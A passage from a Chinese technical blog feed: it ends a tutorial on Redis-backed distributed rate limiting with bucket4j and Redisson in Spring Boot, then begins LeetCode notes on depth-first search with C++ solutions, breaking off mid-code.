        <content type="html"><![CDATA[<p>写在前面：暑期课云原生<del>(云原神)</del>期末大作业的bonus部分需要实现统一限流机制，组长大懒狗不想做交给我完成这个部分，期间踩了很多坑，故有了这篇文章。</p><h2 id="一、导入依赖包："><a href="#一、导入依赖包：" class="headerlink" title="一、导入依赖包："></a>一、导入依赖包：</h2><p>在<code>pom.xml</code>里导入以下依赖包，主要用了bucket4j：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.redisson<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redisson-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.17.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.vladimir-bukhtoyarov<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bucket4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.vladimir-bukhtoyarov<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bucket4j-jcache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>记住需要导入<code>jcache</code>包。</p><h2 id="二、配置部分"><a href="#二、配置部分" class="headerlink" title="二、配置部分"></a>二、配置部分</h2><p>在你的项目配置文件中配置<code>redis</code>需要的配置(这里我的配置文件是properties格式)：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.redis.host</span>=<span class="string">your_server_host_ip</span></span><br><span class="line"><span class="comment"># 端口一般都是6379</span></span><br><span class="line"><span class="attr">spring.redis.port</span>=<span class="string">6379 </span></span><br><span class="line"><span class="attr">spring.redis.password</span>=<span class="string">your_redis_password</span></span><br><span class="line"><span class="attr">spring.redis.timeout</span>=<span class="string">2000ms</span></span><br><span class="line"><span class="attr">spring.redis.database</span>=<span class="string">0</span></span><br></pre></td></tr></table></figure><ul><li>如果没有设置密码的话不用加上password的配置，但是不安全建议加上。</li><li>如果你的redis是开在另一台服务器上的话，记得开放那台服务器的6379端口。</li></ul><h2 id="三、代码部分"><a href="#三、代码部分" class="headerlink" title="三、代码部分"></a>三、代码部分</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.github.bucket4j.Bandwidth;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.Bucket;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.BucketConfiguration;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.Refill;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.distributed.proxy.ProxyManager;</span><br><span class="line"><span class="keyword">import</span> io.github.bucket4j.grid.jcache.JCacheProxyManager;</span><br><span class="line"><span class="keyword">import</span> org.redisson.config.Config;</span><br><span class="line"><span class="keyword">import</span> org.redisson.jcache.configuration.RedissonConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.cache.CacheManager;</span><br><span class="line"><span class="keyword">import</span> javax.cache.Caching;</span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.redis.host:your_server_host_ip&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String redisHost;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.redis.port:6379&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> redisPort;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.redis.password:your_redis_password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String redisPassword;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Config <span class="title function_">config</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Config</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> <span class="string">&quot;redis://&quot;</span> + redisHost + <span class="string">&quot;:&quot;</span> + redisPort;</span><br><span class="line">        config.useSingleServer()</span><br><span class="line">                .setAddress(address)</span><br><span class="line">                .setPassword(redisPassword);</span><br><span class="line">        <span class="keyword">return</span> config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CacheManager <span class="title function_">cacheManager</span><span class="params">(Config config)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CacheManager</span> <span class="variable">cacheManager</span> <span class="operator">=</span> Caching.getCachingProvider(<span class="string">&quot;org.redisson.jcache.JCachingProvider&quot;</span>)</span><br><span class="line">                    .getCacheManager();</span><br><span class="line">            cacheManager.createCache(<span class="string">&quot;cache&quot;</span>, RedissonConfiguration.fromConfig(config));</span><br><span class="line">            <span class="keyword">return</span> cacheManager;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ProxyManager&lt;String&gt; <span class="title function_">proxyManager</span><span class="params">(CacheManager cacheManager)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ProxyManager&lt;String&gt; manager = <span class="keyword">new</span> <span class="title class_">JCacheProxyManager</span>&lt;&gt;(cacheManager.getCache(<span class="string">&quot;cache&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> manager;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Bucket <span class="title function_">bucket</span><span class="params">(ProxyManager&lt;String&gt; proxyManager, CacheManager cacheManager)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里清除了旧的cache，确保每次启动都会是新的bucket</span></span><br><span class="line">            javax.cache.Cache&lt;String, Object&gt; cache = cacheManager.getCache(<span class="string">&quot;cache&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cache != <span class="literal">null</span>) cache.clear();</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">bucketKey</span> <span class="operator">=</span> <span class="string">&quot;rate_limit:hello&quot;</span>;</span><br><span class="line">            <span class="type">Bandwidth</span> <span class="variable">limit</span> <span class="operator">=</span> Bandwidth.classic(<span class="number">40</span>, Refill.greedy(<span class="number">40</span>, Duration.ofMinutes(<span class="number">1</span>)));</span><br><span class="line">            <span class="type">BucketConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> BucketConfiguration.builder()</span><br><span class="line">                    .addLimit(limit)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="type">Bucket</span> <span class="variable">bucket</span> <span class="operator">=</span> proxyManager.builder().build(bucketKey, () -&gt; configuration);</span><br><span class="line">            <span class="keyword">return</span> bucket;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>错误示范：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Integer&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Integer&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        template.setConnectionFactory(redisConnectionFactory);</span><br><span class="line">        template.setDefaultSerializer(<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>());</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Bucket <span class="title function_">bucket</span><span class="params">(RedisTemplate&lt;String, Integer&gt; redisTemplate)</span> &#123;</span><br><span class="line">        <span class="type">Bandwidth</span> <span class="variable">limit</span> <span class="operator">=</span> Bandwidth.classic(<span class="number">20</span>, Refill.greedy(<span class="number">20</span>, Duration.ofMinutes(<span class="number">1</span>)));</span><br><span class="line">        <span class="keyword">return</span> Bucket.builder().addLimit(limit).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然没有爆红，但是实际上并没有用到<code>redisTemplate</code>，尽管仍然能起到限流的作用，但是使用的是bucket的本地限流功能，并不是使用了<code>redis</code>的统一限流。</p><h2 id="四、检查redis是否存在bucket"><a href="#四、检查redis是否存在bucket" class="headerlink" title="四、检查redis是否存在bucket"></a>四、检查redis是否存在bucket</h2><p>使用命令<code>redis-cli -h your_server_host_ip -p 6379 -a your_redis_password</code>来连接你的<code>redis</code>(可能要先下载工具<code>redis-tools</code>)。<br>查询后的结果应该如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post14/3854b46549541b5accbc3145fab69d1e.png" alt="查询结果"></p><p>如果到这里都没有问题的话就可以写脚本开始测试你的限流机制是否正确了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Redis </tag>
            
            <tag> 限流机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(五): 搜索</title>
      <link href="/post/4c67f3df.html"/>
      <url>/post/4c67f3df.html</url>
      
        <content type="html"><![CDATA[<p>搜索算法主要包括深度优先搜索和广度优先搜索。</p><h2 id="一、深度优先搜索"><a href="#一、深度优先搜索" class="headerlink" title="一、深度优先搜索"></a>一、深度优先搜索</h2><ul><li><p>算法介绍：深度优先搜索(depth-ﬁrst search，DFS)在搜索到一个新的节点时，立即对该新节点进行遍历；因此遍历需要用先入后出的栈(stack)来实现，也可以通过与栈等价的递归来实现。对于树结构而言，由于总是对新节点调用遍历，因此看起来是向着“深”的方向前进。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> /</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>考虑上面这棵简单的树，深度优先搜索的顺序为1-&gt;2-&gt;4-&gt;3。</p></li><li><p>补充：</p><ul><li>深度优先搜索可以用来检测环路：记录每个遍历过的节点的父节点，若一个节点被再次遍历且父节点不同，则说明有环。我们也可以用之后会讲到的拓扑排序判断是否有环路，若最后存在入度不为零的点，则说明有环。</li><li>有时我们可能会需要对已经搜索过的节点进行标记，以防止在遍历时重复搜索某个节点，这种做法叫做状态记录或记忆化(memoization)。</li></ul></li><li><p>题目一：<a href="https://leetcode.cn/problems/max-area-of-island">岛屿的最大面积</a><br>给定一个二维的0-1矩阵，其中0表示海洋，1表示陆地。单独的或相邻的陆地可以形成岛屿，每个格子只与其上下左右四个格子相邻。求最大的岛屿面积。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; island;</span><br><span class="line">        vector direction = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; grid.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">                <span class="type">int</span> localArea = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    island.<span class="built_in">push_back</span>(&#123;i, j&#125;);</span><br><span class="line">                    grid[i][j] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (!island.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> [h, l] = island.<span class="built_in">back</span>();</span><br><span class="line">                        island.<span class="built_in">pop_back</span>();</span><br><span class="line">                        ++localArea;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">                            <span class="type">int</span> newH = h + direction[k], newL = l + direction[k + <span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (newH &gt;= <span class="number">0</span> &amp;&amp; newH &lt; grid.<span class="built_in">size</span>() &amp;&amp; newL &gt;= <span class="number">0</span> &amp;&amp; newL &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp; grid[newH][newL] == <span class="number">1</span>) &#123;</span><br><span class="line">                                island.<span class="built_in">push_back</span>(&#123;newH, newL&#125;);</span><br><span class="line">                                grid[newH][newL] = <span class="number">0</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                maxArea = <span class="built_in">max</span>(maxArea, localArea);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解答二(递归解法)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; grid.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>)</span><br><span class="line">                    maxArea = <span class="built_in">max</span>(maxArea, <span class="built_in">dfs</span>(grid, i, j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, <span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= grid.<span class="built_in">size</span>() || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].<span class="built_in">size</span>() || grid[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[i][j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">dfs</span>(grid, i + <span class="number">1</span>, j) + <span class="built_in">dfs</span>(grid, i - <span class="number">1</span>, j) + <span class="built_in">dfs</span>(grid, i, j + <span class="number">1</span>) + <span class="built_in">dfs</span>(grid, i, j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：非常标准的深度搜索题，要记得做状态记录。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/number-of-provinces">省份数量</a><br>给定一个二维的0-1矩阵，如果第(i, j)位置是1，则表示第i个城市和第j个城市处于同一城市圈。已知城市的相邻关系是可以传递的，即如果a和b相邻，b和c相邻，那么a和c也相邻，换言之这三个城市处于同一个城市圈之内。求一共有多少个城市圈。<br><img src="https://assets.leetcode.com/uploads/2020/12/24/graph1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;isConnected, <span class="type">int</span> i, vector&lt;<span class="type">bool</span>&gt; &amp;visited)</span> </span>&#123;</span><br><span class="line">        visited[i] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; isConnected.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isConnected[i][j] == <span class="number">1</span> &amp;&amp; !visited[j]) &#123;</span><br><span class="line">                <span class="built_in">dfs</span>(isConnected, j, visited);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findCircleNum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;isConnected)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = isConnected.<span class="built_in">size</span>(), count = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[i]) &#123;</span><br><span class="line">                <span class="built_in">dfs</span>(isConnected, i, visited);</span><br><span class="line">                ++count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用状态数组来记录状态。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/pacific-atlantic-water-flow">太平洋大西洋水流问题</a><br>给定一个二维的非负整数矩阵，每个位置的值表示海拔高度。假设左边和上边是太平洋，右边和下边是大西洋，求从哪些位置向下流水，可以流到太平洋和大西洋。水只能从海拔高的位置流到海拔低或相同的位置。<br><img src="https://assets.leetcode.com/uploads/2021/06/08/waterflow-grid.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; directions = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">pacificAtlantic</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; heights) &#123;</span><br><span class="line">        <span class="type">int</span> m = heights.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = heights[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">canReachP</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">canReachA</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="built_in">flow</span>(heights, canReachP, i, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">flow</span>(heights, canReachA, i, n - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="built_in">flow</span>(heights, canReachP, <span class="number">0</span>, i);</span><br><span class="line">            <span class="built_in">flow</span>(heights, canReachA, m - <span class="number">1</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (canReachA[i][j] &amp;&amp; canReachP[i][j])</span><br><span class="line">                    res.<span class="built_in">push_back</span>(&#123;i, j&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">flow</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; heights, vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt;&amp; canReach, <span class="type">int</span> l, <span class="type">int</span> c)</span> </span>&#123;</span><br><span 